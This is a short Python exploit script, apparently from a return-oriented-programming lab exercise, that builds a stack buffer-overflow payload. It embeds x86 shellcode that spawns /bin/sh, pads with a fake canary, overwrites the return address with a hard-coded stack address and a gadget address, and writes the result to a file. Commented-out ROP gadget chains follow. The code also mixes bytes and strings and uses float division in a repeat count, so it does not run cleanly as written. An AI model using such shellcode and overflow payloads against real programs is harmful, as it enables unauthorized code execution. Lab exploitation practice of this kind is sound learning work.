import os
import struct

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#Find gadgets
disable_security_check = 0x0804852b  # objdump -d | grep feeling_sick
return_buffer = 0xbffff1f8
canary = 0x41414141

# pointer overwriting
print(len(shellcode))
payload = shellcode
canary_distance = 108 -len(shellcode)
payload += struct.pack("I", canary)*((canary_distance/4))
payload += struct.pack("I", return_buffer)
payload += struct.pack("I", return_buffer)
payload += struct.pack("I", return_buffer)
payload += "B"*(263-len(shellcode)-canary_distance-12)
payload += struct.pack("I",disable_security_check)


#food(0xdeadbeef) gadget
#payload += struct.pack("I", food)
#payload += struct.pack("I", pop_ret)
#payload += struct.pack("I", 0xdeadbeef)

#feeling_sick(0xd15ea5e, 0x0badf00d) gadget
#payload += struct.pack("I", feeling_sick)
#payload += struct.pack("I", pop_pop_ret)
#payload += struct.pack("I", 0xd15ea5e)
#payload += struct.pack("I", 0x0badf00d)

#payload += struct.pack("I", lazy)

f = open("badfile", "a")
f.write("%s" % payload) 
f.close()
#os.system("./simple-rop \"%s\"" % payload)
